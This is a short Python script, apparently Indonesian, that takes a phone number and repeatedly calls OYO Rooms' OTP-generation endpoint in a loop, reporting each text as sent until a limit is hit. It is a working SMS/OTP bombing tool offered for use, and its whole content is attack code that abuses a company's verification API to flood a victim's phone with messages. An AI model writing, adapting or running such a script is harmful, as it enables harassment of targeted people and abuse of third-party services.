import requests, os
os.system('clear')
print("##################################")
print("Creator @Mr.Ti")
i=int(0)
no=input("Nomer Hp 08")
while True:
	idk=('status')
	r=requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+no+'&country_code=+62')
	if str(idk) in str(r.text):
		print("[][][][][][][][][][][]:: Terkirim bos ku ::[][][][][][][][][][][]")
	else:
		print("[][][][][][][][][][][]:: Gagal bos ku ::[][][][][][][][][][][]")
		print("Pesan # Nomer Hape uwes LIMIT")
		break
	i+=1
	if i == 20:
		print(" Nomer Hape uwes LIMIT")
		break